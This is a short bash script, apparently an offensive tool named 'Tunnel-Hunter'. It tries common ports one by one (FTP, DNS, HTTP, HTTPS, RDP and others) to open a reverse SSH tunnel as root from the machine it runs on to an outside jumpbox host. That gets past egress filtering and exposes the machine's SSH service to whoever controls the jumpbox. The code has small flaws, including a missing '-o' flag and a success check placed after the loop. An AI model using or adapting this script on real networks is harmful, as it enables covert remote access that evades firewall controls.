#!/bin/bash

createTunnel() {

echo ""
echo "  ______                       __      __  __            __"           
echo " /_  __/_  ______  ____  ___  / /     / / / /_  ______  / /____  _____"
echo "  / / / / / / __ \/ __ \/ _ \/ /_____/ /_/ / / / / __ \/ __/ _ \/ ___/"
echo " / / / /_/ / / / / / / /  __/ /_____/ __  / /_/ / / / / /_/  __/ /"    
echo "/_/  \__,_/_/ /_/_/ /_/\___/_/     /_/ /_/\__,_/_/ /_/\__/\___/_/"
echo ""
echo "Description: Searches egress of common ports and establishes a SSH tunnel."
echo "Written by Shane Rudy aka @H011YxW00D aka BlueSp4ce"
echo "ara1212@gmail.com"
echo ""

echo "+-+-+-+-+-+-+-+ +-+-+-+ +-+ +-+-+-+-+-+-+-+-+-+"
echo "|H|u|n|t|i|n|g| |F|o|r| |A| |T|u|n|n|e|l|.|.|.|"
echo "+-+-+-+-+-+-+-+ +-+-+-+ +-+ +-+-+-+-+-+-+-+-+-+"
echo ""

host="IP or Hostname Here"
for i in $( echo -e "21\n22\n23\n20\n25\n53\n80\n110\n143\n443\n465\n587\n993\n995\n3128\n3389\n5060\n5500\n8443\n1494\n8080\n" ); 
  do
    /usr/bin/ssh -o ConnectTimeout=10 ExitOnForwardFailure=yes -N -R 5$i:localhost:22 root@$host -p$i
  done
  if [[ $? -eq 0 ]]; then
    echo Tunnel success on port $i
 else
    echo An error occurred creating a tunnel to jumpbox on port $i. RC was $?  
fi
}

tunnels=$(ps waux  | grep ssh | grep -i ConnectTimeout  |  awk '{print $2}' | wc -l)
if [[ $tunnels -gt 1 ]]; then
echo Tunnel established already. Exiting.
        exit 1
else
 createTunnel
fi
